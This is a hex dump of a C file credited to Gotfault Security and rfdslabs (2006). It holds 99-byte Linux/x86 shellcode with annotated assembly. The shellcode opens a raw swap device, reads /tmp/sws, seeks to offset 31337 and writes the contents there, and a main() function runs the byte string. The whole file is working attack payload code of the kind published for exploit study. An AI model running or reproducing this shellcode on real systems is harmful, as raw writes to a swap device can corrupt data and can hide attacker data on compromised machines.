00000000  2f 2a 20 0d 0a 20 2a 20  6c 69 6e 75 78 2d 78 38  |/* .. * linux-x8|
00000010  36 2d 73 77 61 70 2d 73  74 6f 72 65 2e 63 20 2d  |6-swap-store.c -|
00000020  20 53 57 41 50 20 73 74  6f 72 65 20 73 68 65 6c  | SWAP store shel|
00000030  6c 63 6f 64 65 20 39 39  20 62 79 74 65 73 20 66  |lcode 99 bytes f|
00000040  6f 72 20 4c 69 6e 75 78  2f 78 38 36 0d 0a 20 2a  |or Linux/x86.. *|
00000050  20 43 6f 70 79 72 69 67  68 74 20 28 63 29 20 32  | Copyright (c) 2|
00000060  30 30 36 20 47 6f 74 66  61 75 6c 74 20 53 65 63  |006 Gotfault Sec|
00000070  75 72 69 74 79 20 26 20  72 66 64 73 6c 61 62 73  |urity & rfdslabs|
00000080  0d 0a 20 2a 0d 0a 20 2a  20 41 75 74 68 6f 72 73  |.. *.. * Authors|
00000090  3a 0d 0a 20 2a 0d 0a 20  2a 09 64 78 20 09 3c 78  |:.. *.. *.dx .<x|
000000a0  67 63 40 67 6f 74 66 61  75 6c 74 2e 6e 65 74 3e  |gc@gotfault.net>|
000000b0  20 0d 0a 20 2a 09 73 70  75 64 09 3c 67 75 73 74  | .. *.spud.<gust|
000000c0  61 76 6f 40 72 66 64 73  6c 61 62 73 2e 63 6f 6d  |avo@rfdslabs.com|
000000d0  2e 62 72 3e 0d 0a 20 2a  20 0d 0a 20 2a 20 54 68  |.br>.. * .. * Th|
000000e0  69 73 20 73 68 65 6c 6c  63 6f 64 65 20 72 65 61  |is shellcode rea|
000000f0  64 73 20 74 68 65 20 63  6f 6e 74 65 6e 74 20 6f  |ds the content o|
00000100  66 20 27 2f 74 6d 70 2f  73 77 73 27 20 61 6e 64  |f '/tmp/sws' and|
00000110  20 73 74 6f 72 65 73 20  6f 6e 20 73 77 61 70 20  | stores on swap |
00000120  0d 0a 20 2a 20 64 65 76  69 63 65 20 61 74 20 6f  |.. * device at o|
00000130  66 66 73 65 74 20 33 31  33 33 37 2e 20 50 72 6f  |ffset 31337. Pro|
00000140  62 61 6c 79 20 6e 65 65  64 73 20 74 6f 20 63 68  |baly needs to ch|
00000150  61 6e 67 65 20 74 68 65  20 64 65 76 69 63 65 20  |ange the device |
00000160  70 61 74 68 20 6e 61 6d  65 0d 0a 20 2a 20 69 6e  |path name.. * in|
00000170  20 6f 70 65 6e 28 29 20  64 65 76 69 63 65 20 73  | open() device s|
00000180  79 73 63 61 6c 6c 2e 0d  0a 20 2a 0d 0a 20 2a 2f  |yscall... *.. */|
00000190  0d 0a 0d 0a 63 68 61 72  20 73 68 65 6c 6c 63 6f  |....char shellco|
000001a0  64 65 5b 5d 20 3d 0d 0a  0d 0a 20 20 2f 2a 20 6f  |de[] =....  /* o|
000001b0  70 65 6e 28 64 65 76 69  63 65 2c 20 4f 5f 57 52  |pen(device, O_WR|
000001c0  4f 4e 4c 59 29 20 2a 2f  0d 0a 0d 0a 20 20 22 5c  |ONLY) */....  "\|
000001d0  78 36 61 5c 78 30 35 22  20 20 20 20 20 20 20 20  |x6a\x05"        |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
000001f0  75 73 68 20 20 20 24 30  78 35 0d 0a 20 20 22 5c  |ush   $0x5..  "\|
00000200  78 35 38 22 20 20 20 20  20 20 20 20 20 20 20 20  |x58"            |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000220  6f 70 20 20 20 20 25 65  61 78 0d 0a 20 20 22 5c  |op    %eax..  "\|
00000230  78 39 39 22 20 20 20 20  20 20 20 20 20 20 20 20  |x99"            |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 63  |            // c|
00000250  6c 74 64 20 20 20 0d 0a  20 20 22 5c 78 35 32 22  |ltd   ..  "\x52"|
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000270  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000280  20 20 25 65 64 78 0d 0a  20 20 22 5c 78 36 38 5c  |  %edx..  "\x68\|
00000290  78 37 33 5c 78 36 34 5c  78 36 31 5c 78 33 31 22  |x73\x64\x61\x31"|
000002a0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
000002b0  20 20 24 30 78 33 31 36  31 36 34 37 33 0d 0a 20  |  $0x31616473.. |
000002c0  20 22 5c 78 36 38 5c 78  36 34 5c 78 36 35 5c 78  | "\x68\x64\x65\x|
000002d0  37 36 5c 78 32 66 22 20  20 20 20 20 20 20 20 2f  |76\x2f"        /|
000002e0  2f 20 70 75 73 68 20 20  20 24 30 78 32 66 37 36  |/ push   $0x2f76|
000002f0  36 35 36 34 0d 0a 20 20  22 5c 78 36 36 5c 78 36  |6564..  "\x66\x6|
00000300  38 5c 78 32 66 5c 78 32  66 22 20 20 20 20 20 20  |8\x2f\x2f"      |
00000310  20 20 20 20 20 20 2f 2f  20 70 75 73 68 77 20 20  |      // pushw  |
00000320  24 30 78 32 66 32 66 0d  0a 20 20 22 5c 78 38 39  |$0x2f2f..  "\x89|
00000330  5c 78 65 33 22 20 20 20  20 20 20 20 20 20 20 20  |\xe3"           |
00000340  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000350  20 20 20 25 65 73 70 2c  25 65 62 78 0d 0a 20 20  |   %esp,%ebx..  |
00000360  22 5c 78 36 61 5c 78 30  31 22 20 20 20 20 20 20  |"\x6a\x01"      |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000380  20 70 75 73 68 20 20 20  24 30 78 31 0d 0a 20 20  | push   $0x1..  |
00000390  22 5c 78 35 39 22 20 20  20 20 20 20 20 20 20 20  |"\x59"          |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000003b0  20 70 6f 70 20 20 20 20  25 65 63 78 0d 0a 20 20  | pop    %ecx..  |
000003c0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000003e0  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
000003f0  0a 20 20 22 5c 78 39 37  22 20 20 20 20 20 20 20  |.  "\x97"       |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 2f 2f 20 78 63 68 67  20 20 20 25 65 61 78 2c  | // xchg   %eax,|
00000420  25 65 64 69 0d 0a 0d 0a  20 20 2f 2a 20 6f 70 65  |%edi....  /* ope|
00000430  6e 28 22 2f 74 6d 70 2f  73 77 73 22 2c 20 4f 5f  |n("/tmp/sws", O_|
00000440  52 44 4f 4e 4c 59 29 20  2a 2f 0d 0a 0d 0a 20 20  |RDONLY) */....  |
00000450  22 5c 78 34 39 22 20 20  20 20 20 20 20 20 20 20  |"\x49"          |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000470  20 64 65 63 20 20 20 20  25 65 63 78 0d 0a 20 20  | dec    %ecx..  |
00000480  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000004a0  20 70 75 73 68 20 20 20  25 65 64 78 0d 0a 20 20  | push   %edx..  |
000004b0  22 5c 78 36 38 5c 78 32  66 5c 78 37 33 5c 78 37  |"\x68\x2f\x73\x7|
000004c0  37 5c 78 37 33 22 20 20  20 20 20 20 20 20 2f 2f  |7\x73"        //|
000004d0  20 70 75 73 68 20 20 20  24 30 78 37 33 37 37 37  | push   $0x73777|
000004e0  33 32 66 0d 0a 20 20 22  5c 78 36 38 5c 78 32 66  |32f..  "\x68\x2f|
000004f0  5c 78 37 34 5c 78 36 64  5c 78 37 30 22 20 20 20  |\x74\x6d\x70"   |
00000500  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
00000510  30 78 37 30 36 64 37 34  32 66 0d 0a 20 20 22 5c  |0x706d742f..  "\|
00000520  78 38 39 5c 78 65 33 22  20 20 20 20 20 20 20 20  |x89\xe3"        |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
00000540  6f 76 20 20 20 20 25 65  73 70 2c 25 65 62 78 0d  |ov    %esp,%ebx.|
00000550  0a 20 20 22 5c 78 36 61  5c 78 30 35 22 20 20 20  |.  "\x6a\x05"   |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000570  20 2f 2f 20 70 75 73 68  20 20 20 24 30 78 35 0d  | // push   $0x5.|
00000580  0a 20 20 22 5c 78 35 38  22 20 20 20 20 20 20 20  |.  "\x58"       |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 2f 2f 20 70 6f 70 20  20 20 20 25 65 61 78 0d  | // pop    %eax.|
000005b0  0a 20 20 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |.  "\xcd\x80"   |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005d0  20 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  | // int    $0x80|
000005e0  0d 0a 0d 0a 20 20 22 5c  78 39 33 22 20 20 20 20  |....  "\x93"    |
000005f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000600  20 20 20 20 2f 2f 20 78  63 68 67 20 20 20 25 65  |    // xchg   %e|
00000610  61 78 2c 25 65 62 78 0d  0a 0d 0a 20 20 2f 2a 20  |ax,%ebx....  /* |
00000620  72 65 61 64 28 66 64 5f  66 69 6c 65 6e 61 6d 65  |read(fd_filename|
00000630  2c 20 2a 62 75 66 2c 20  32 35 36 29 20 2a 2f 0d  |, *buf, 256) */.|
00000640  0a 0d 0a 20 20 22 5c 78  38 39 5c 78 65 31 22 20  |...  "\x89\xe1" |
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000660  20 20 20 2f 2f 20 6d 6f  76 20 20 20 20 25 65 73  |   // mov    %es|
00000670  70 2c 25 65 63 78 0d 0a  20 20 22 5c 78 34 32 22  |p,%ecx..  "\x42"|
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000690  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 63 20 20  |        // inc  |
000006a0  20 20 25 65 64 78 0d 0a  20 20 22 5c 78 63 31 5c  |  %edx..  "\xc1\|
000006b0  78 65 32 5c 78 30 61 22  20 20 20 20 20 20 20 20  |xe2\x0a"        |
000006c0  20 20 20 20 20 20 20 20  2f 2f 20 73 68 6c 20 20  |        // shl  |
000006d0  20 20 24 30 78 61 2c 25  65 64 78 0d 0a 20 20 22  |  $0xa,%edx..  "|
000006e0  5c 78 36 61 5c 78 30 33  22 20 20 20 20 20 20 20  |\x6a\x03"       |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000700  70 75 73 68 20 20 20 24  30 78 33 0d 0a 20 20 22  |push   $0x3..  "|
00000710  5c 78 35 38 22 20 20 20  20 20 20 20 20 20 20 20  |\x58"           |
00000720  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000730  70 6f 70 20 20 20 20 25  65 61 78 0d 0a 20 20 22  |pop    %eax..  "|
00000740  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000750  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000760  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
00000770  20 20 22 5c 78 39 36 22  20 20 20 20 20 20 20 20  |  "\x96"        |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000790  2f 2f 20 78 63 68 67 20  20 20 25 65 61 78 2c 25  |// xchg   %eax,%|
000007a0  65 73 69 0d 0a 0d 0a 20  20 2f 2a 20 63 6c 6f 73  |esi....  /* clos|
000007b0  65 28 66 64 5f 66 69 6c  65 6e 61 6d 65 29 20 2a  |e(fd_filename) *|
000007c0  2f 0d 0a 0d 0a 20 20 22  5c 78 36 61 5c 78 30 36  |/....  "\x6a\x06|
000007d0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000007e0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
000007f0  30 78 36 0d 0a 20 20 22  5c 78 35 38 22 20 20 20  |0x6..  "\x58"   |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000810  20 20 20 20 20 2f 2f 20  70 6f 70 20 20 20 20 25  |     // pop    %|
00000820  65 61 78 0d 0a 20 20 22  5c 78 63 64 5c 78 38 30  |eax..  "\xcd\x80|
00000830  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000840  20 20 20 20 20 2f 2f 20  69 6e 74 20 20 20 20 24  |     // int    $|
00000850  30 78 38 30 0d 0a 0d 0a  20 20 22 5c 78 39 32 22  |0x80....  "\x92"|
00000860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000870  20 20 20 20 20 20 20 20  2f 2f 20 78 63 68 67 20  |        // xchg |
00000880  20 20 25 65 61 78 2c 25  65 64 78 0d 0a 0d 0a 20  |  %eax,%edx.... |
00000890  20 2f 2a 20 6c 73 65 65  6b 28 66 64 5f 64 65 76  | /* lseek(fd_dev|
000008a0  69 63 65 2c 20 33 31 33  33 37 2c 20 53 45 45 4b  |ice, 31337, SEEK|
000008b0  5f 53 45 54 29 20 2a 2f  0d 0a 0d 0a 20 20 22 5c  |_SET) */....  "\|
000008c0  78 33 31 5c 78 63 39 22  20 20 20 20 20 20 20 20  |x31\xc9"        |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |            // x|
000008e0  6f 72 20 20 20 20 25 65  63 78 2c 25 65 63 78 0d  |or    %ecx,%ecx.|
000008f0  0a 20 20 22 5c 78 36 61  5c 78 31 33 22 20 20 20  |.  "\x6a\x13"   |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000910  20 2f 2f 20 70 75 73 68  20 20 20 24 30 78 31 33  | // push   $0x13|
00000920  0d 0a 20 20 22 5c 78 35  38 22 20 20 20 20 20 20  |..  "\x58"      |
00000930  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000940  20 20 2f 2f 20 70 6f 70  20 20 20 20 25 65 61 78  |  // pop    %eax|
00000950  0d 0a 20 20 22 5c 78 38  39 5c 78 66 62 22 20 20  |..  "\x89\xfb"  |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000970  20 20 2f 2f 20 6d 6f 76  20 20 20 20 25 65 64 69  |  // mov    %edi|
00000980  2c 25 65 62 78 0d 0a 20  20 22 5c 78 36 36 5c 78  |,%ebx..  "\x66\x|
00000990  62 39 5c 78 36 39 5c 78  37 61 22 20 20 20 20 20  |b9\x69\x7a"     |
000009a0  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
000009b0  20 24 30 78 37 61 36 39  2c 25 63 78 0d 0a 20 20  | $0x7a69,%cx..  |
000009c0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
000009d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000009e0  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
000009f0  0a 20 20 2f 2a 20 77 72  69 74 65 28 66 64 5f 64  |.  /* write(fd_d|
00000a00  65 76 69 63 65 2c 20 2a  62 75 66 2c 20 31 30 32  |evice, *buf, 102|
00000a10  35 29 20 2a 2f 0d 0a 0d  0a 0d 0a 20 20 22 5c 78  |5) */......  "\x|
00000a20  38 39 5c 78 31 34 5c 78  33 34 22 20 20 20 20 20  |89\x14\x34"     |
00000a30  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000a40  76 20 20 20 20 25 65 64  78 2c 28 25 65 73 70 2c  |v    %edx,(%esp,|
00000a50  25 65 73 69 2c 31 29 0d  0a 20 20 22 5c 78 36 61  |%esi,1)..  "\x6a|
00000a60  5c 78 30 34 22 20 20 20  20 20 20 20 20 20 20 20  |\x04"           |
00000a70  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000a80  20 20 20 24 30 78 34 0d  0a 20 20 22 5c 78 35 38  |   $0x4..  "\x58|
00000a90  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000aa0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000ab0  20 20 20 25 65 61 78 0d  0a 20 20 22 5c 78 35 34  |   %eax..  "\x54|
00000ac0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000ad0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000ae0  20 20 20 25 65 73 70 0d  0a 20 20 22 5c 78 35 39  |   %esp..  "\x59|
00000af0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000b00  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000b10  20 20 20 25 65 63 78 0d  0a 20 20 22 5c 78 35 36  |   %ecx..  "\x56|
00000b20  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000b30  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000b40  20 20 20 25 65 73 69 0d  0a 20 20 22 5c 78 35 61  |   %esi..  "\x5a|
00000b50  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000b60  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00000b70  20 20 20 25 65 64 78 0d  0a 20 20 22 5c 78 34 32  |   %edx..  "\x42|
00000b80  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000b90  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 63 20  |         // inc |
00000ba0  20 20 20 25 65 64 78 0d  0a 20 20 22 5c 78 63 64  |   %edx..  "\xcd|
00000bb0  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000bc0  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000bd0  20 20 20 24 30 78 38 30  0d 0a 0d 0a 20 20 2f 2a  |   $0x80....  /*|
00000be0  20 63 6c 6f 73 65 28 66  64 5f 64 65 76 69 63 65  | close(fd_device|
00000bf0  29 20 2a 2f 0d 0a 0d 0a  20 20 22 5c 78 62 30 5c  |) */....  "\xb0\|
00000c00  78 30 36 22 20 20 20 20  20 20 20 20 20 20 20 20  |x06"            |
00000c10  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
00000c20  20 20 24 30 78 36 2c 25  61 6c 0d 0a 20 20 22 5c  |  $0x6,%al..  "\|
00000c30  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
00000c40  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000c50  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 0d 0a 20  |nt    $0x80.... |
00000c60  20 2f 2a 20 65 78 69 74  28 61 6e 79 74 68 69 6e  | /* exit(anythin|
00000c70  67 29 20 2a 2f 0d 0a 0d  0a 20 20 22 5c 78 62 30  |g) */....  "\xb0|
00000c80  5c 78 30 31 22 20 20 20  20 20 20 20 20 20 20 20  |\x01"           |
00000c90  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000ca0  20 20 20 24 30 78 31 2c  25 61 6c 0d 0a 20 20 22  |   $0x1,%al..  "|
00000cb0  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000cc0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000cd0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 3b 0d  |int    $0x80..;.|
00000ce0  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 20 7b 0d  |...int main() {.|
00000cf0  0a 20 0d 0a 20 20 20 20  20 20 20 20 69 6e 74 20  |. ..        int |
00000d00  28 2a 66 29 28 29 20 3d  20 28 69 6e 74 28 2a 29  |(*f)() = (int(*)|
00000d10  28 29 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 20  |())shellcode;.. |
00000d20  20 20 20 20 20 20 20 70  72 69 6e 74 66 28 22 4c  |       printf("L|
00000d30  65 6e 67 74 68 3a 20 25  75 5c 6e 22 2c 20 73 74  |ength: %u\n", st|
00000d40  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
00000d50  3b 0d 0a 20 20 20 20 20  20 20 20 66 28 29 3b 0d  |;..        f();.|
00000d60  0a 7d                                             |.}|
00000d62
